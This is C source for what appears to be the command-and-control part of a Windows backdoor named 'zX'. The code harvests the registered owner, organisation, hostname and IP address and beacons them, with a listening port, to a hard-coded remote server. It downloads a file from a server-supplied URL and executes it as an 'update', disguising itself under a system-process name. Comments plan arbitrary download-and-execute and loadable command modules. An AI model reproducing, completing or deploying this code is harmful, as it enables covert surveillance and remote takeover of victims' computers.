#include "defines.h"
#include "macros.h"
#include "types.h"
#include "globals.h"

#include "misc.h"
#include "chk4net.h"

int loginStatus=0;

/*
%1		GetTempPath
%2		GetWindowsDirectory
%3		GetSystemDirectory

*/

char  zXnew_url[MaxUrlLen];

int zXgetNewVer(char *url){
#define hostFileName		"TASKMON.EXE"//"SYSTRAY.EXE"

#define svr (path)
#define get (path+64)

	char path[128];
	unsigned short port=80;
	SOCKET	s=-1;
	char	buf[2048];
	int		i,i0,iT;
	HANDLE hF=0;

  crackURL(url,svr,get,&port,0,0,0);

	if ((s=tcpConnect(svr,port))<0)
		goto failed;

	wsprintf(buf,	"GET %s HTTP/1.0\r\n"
					      "Host: %s\r\n"
					      "Accept: */*\r\n"
					      "User-Agent: %s/%8.8x\r\n"
					      "Connection: close\r\n\r\n",
                get, svr, zXver, zXver_num);

	if (_send(s, buf, lstrlen(buf), 0)==SOCKET_ERROR)
		goto failed;

	if ((i=_recv(s, buf, 12/*HTTP/X.X XXX*/, 0)) &&
        i!=SOCKET_ERROR && *((unsigned long *)(buf+8))=='002 '/*200->HTTP.OK*/){
		for(iT=0;iT<2048 && (i=_recv(s,buf+iT,2048-iT,0)) && i!=SOCKET_ERROR;iT+=i);
		if (i==SOCKET_ERROR)
			goto failed;
		for(i0=0;i0<iT && *((unsigned long *)(buf+i0))!=0x0a0d0a0d;++i0);

    GetTempPath(128,path);GetTempFileName(path,"7F8",0,path);
 	  /*
    i=GetSystemDirectory(path, 128);
	  *((unsigned short *)(path+i))='\\';
	  lstrcpyn(path+i+1, hostFileName, 128-i-1);
    */
	  if (!(hF=CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)))
		  goto failed;

		WriteFile(hF, buf+i0+4, iT-i0-4, &iT, 0);/* WriteFile(hF,buf,iT,&iT,0); */
		while(i){
			i=_recv(s,buf,2048,0);
			if (i==SOCKET_ERROR)
				goto failed;
			WriteFile(hF,buf,i,&i0,0);
			iT+=i;
		}
	}
	else
		goto failed;
	_closesocket(s);
  CloseHandle(hF);
  createProcess(path);/*install the new version!*/
	return ~0;
failed:
  if (s>=0)
	  _closesocket(s);
	if (hF)
		CloseHandle(hF);
	return 0;
}

int zXlogin(void *v){
	SOCKET s;
	char buf[zXbufSize];
	char data2post[zXbufSize];

	HKEY		hK;
	char		zXid[13];
	DWORD		type,len;
	SYSTEMTIME	time;
	char		enc[17];
	DWORD		ENC;
	int			i,i0,iT;

  char regdCompany[100];
	char regdOwner[100];

DWORD	t_timer=GetTickCount();

#define regRootKey		  HKEY_LOCAL_MACHINE
#define regzXidPath		  "Software\\Microsoft\\Windows\\CurrentVersion" //this path must exist; else fn will fail
#define regzXidKeyName	"ProductCode"
#define regRegdOwner	  "RegisteredOwner"
#define regRegdOrgzn	  "RegisteredOrganization"
#define encString		    "BCDFGHJKLPQVWXYZ"

	KillTimer(hW,zXtimer_relogin);
	loginStatus=1;/*to prevent further zXlogin threads from being created.*/

	lstrcpy(buf,"error!");    /*buf="error!"*/
	lstrcpy(regdOwner,buf);   /*regdOwner="error!"*/
	lstrcpy(regdCompany,buf); /*regdCompany="error!"*/
	lstrcpy(zXid,buf);        /*zXid="error!"*/
  if (_RegOpenKeyEx(regRootKey,regzXidPath,0,KEY_READ|KEY_WRITE,&hK)==ERROR_SUCCESS){
    len=100;_RegQueryValueEx(hK,regRegdOwner,0,&type,regdOwner,&len);
    len=100;_RegQueryValueEx(hK,regRegdOrgzn,0,&type,regdCompany,&len);
    len=9;
    if ((_RegQueryValueEx(hK,regzXidKeyName,0,&type,zXid,&len)!=ERROR_SUCCESS)
        || (type!=REG_SZ) || (len!=9)){
      /*machine does not have a (valid 8 alphabet) zXid; so generate one ...*/
      lstrcpyn(enc,encString,17);
      GetSystemTime(&time);
      /* year:6;month:4;date:5;hour:5;min:6;msecs:6;total:32 bits */
      ENC=(time.wYear<<26)|(time.wMonth<<22)|(time.wDay<<17)|(time.wHour<<12)|(time.wMinute<<6)|(time.wMilliseconds & 0x3F);
      for (i=0;i<8;++i,ENC>>=4) /*get the eight nybbles one by one*/
      zXid[i]=enc[ENC & 0x0F];/*get corresponding code char*/
      zXid[8]=0;
      _RegSetValueEx(hK,regzXidKeyName,0,REG_SZ,zXid,9);
    }
    _RegCloseKey(hK);
  }

#ifndef loginOnStartup
	if (!checkForNet()){
		loginStatus=0;
		return ~0;
	}
#endif
  if ((s=tcpConnect(LoginServer,LoginServerPort))<0)
    goto loginFailed;
  _gethostname(g_hostName,MaxHostNameLen);
	wsprintf(buf, "POST %s?%s HTTP/1.0\r\n"	      /* POST /login.cgi?LXGJJXDG HTTP/1.0 */
					      "Host: %s\r\n"				          /* Host: zX-0.virtualave.net */
					      "Accept: */*\r\n"			          /* Accept: text/plain */
					      "User-Agent: %s/%8.8x\r\n"	    /* User-Agent: zX_v0.5.6b[14nov2k]/00011114 */
					      "From: [%s]:[%s]@[%s]\r\n"	    /* From: [RG][Zyxware]@[rg] */
					      "Referrer: telnet://%s:%u/\r\n" /* Referrer: http://rg:2857/ */
					      "Connection: close\r\n",        /* Connection: close */
				  LoginCGI,       //	/login.cgi
					zXid,		        //	LXGJJXDG
					LoginServer,	  //	zX-0.virtualave.net
					zXver,		      //	zX_v0.5.6b[14Nov2k]
					zXver_num,	    //	001114
					regdOwner,	    //	RG
					regdCompany,    //	Zyxware
					g_hostName,	      //	rg
					ip2a(*((h_this=_gethostbyname(g_hostName))->h_addr_list[0])),/*this machine's ip*/
					zXport		//	2857
			);

  if (_send(s,buf,lstrlen(buf),0)==SOCKET_ERROR){
    /* transaction unsuccessful */
    _closesocket(s);
		goto loginFailed;
  }
	wsprintf(data2post,	"port=%u\r\n"
						          "logintime=%ums\r\n",
                      zXport, GetTickCount()-t_timer);
	wsprintf(buf,	"Content-length:%u\r\n\r\n", lstrlen(data2post));
	_send(s, buf, lstrlen(buf), 0);
	_send(s, data2post, lstrlen(data2post), 0);
	for(iT=0;
        iT<zXbufSize && (i0=_recv(s,buf+iT,zXbufSize-iT,0));/*recv until close (HTTP/1.0)*/
          iT+=i0);
  buf[iT]=0;/*null-terminate the returned 'string'*//*BUG:when data is 4k exact, null is outside*/
	_closesocket(s);

	loginStatus=~0;/*login was successful*/
	SetTimer(hW,zXtimer_relogin,LoginDelay,0);

  //imb(buf);/*display what i got from the http-server*/
  /* httpRetCode is of the form "HTTP/1.x <???> ...." */
  /*  httpRetCode=200 -> http.OK (no_error)*/
	for(i0=0;i0<iT && buf[i0]!=' ';++i0);/*search for the ' '*/
  if (*((unsigned long *)(buf+i0))=='002 '/* httpRetCode==200 */){/*no_error*/
    /*http header and data are separated by a double new line, so find it*/
		while(i0<iT && (*((unsigned long *)(buf+(i0++))))!=0x0a0d0a0d);
		i0+=3;buf[iT]=0;/*i0 & iT are now pointers to the beginning and the end of data*/

		//MUST send back meaningful data like :latest zX version,new login url,etc
		/*
			zXv:00010722\0
			url:http://zX-0.virtualave.net/svr/00010722\0
010722
      // TODOs :
      lcm:01010722\0  #loadable command module
      url:http://zX-0.virtualave.net/lcm/01010722\0

      exe:02010722\0  #misc executables (executed after downloading)
      url:http://www.winzip.com/download/winzip.exe\0
      lfn:%1\wz.dat\0
			
      get:02010722\0  #misc files (will not be executed after downloading)
      url:http://www.winzip.com/download/winzip.exe\0
      lfn:%1\wz.dat   #local file name; %1=windows; %2=system; %3=common files; etc
      
      lgn:http://zX-1.hypermart.net/in.cgi  #other (backup) 'login servers'
		*/

    /*only 'zXv:' has been implemented, below*/
		for(i=i0;i<iT && *((unsigned long *)(buf+i))!=':vXz';++i); i+=4/*zXv:*/;
		if (i<iT){
			for(i0=i+1;buf[i0] && i0<iT;++i0); buf[i0]=0;
#define zXver_num_new _atox(buf+i)
			if (zXver_num_new>zXver_num){/*newer version available!*/
				if (*((unsigned long *)(buf+(++i0)))==':lru'){
					i=i0+4/*"url:"*/;i0+=1+lstrlen(buf+i0);/*'i0' now points to the next 'data-set'*/
					lstrcpyn(zXnew_url,buf+i,MaxUrlLen);
					thread(zXgetNewVer,&zXnew_url);
				}
			}
		}
	}
	return 0;/*no_err*/

loginFailed:
	loginStatus=1;/*to prevent further zXlogin threads from being created by chk4net timer ...*/
	SetTimer(hW,zXtimer_relogin,LoginFailedDelay,0);/*re-attempt login*/
	return ~0;/*failed*/
}
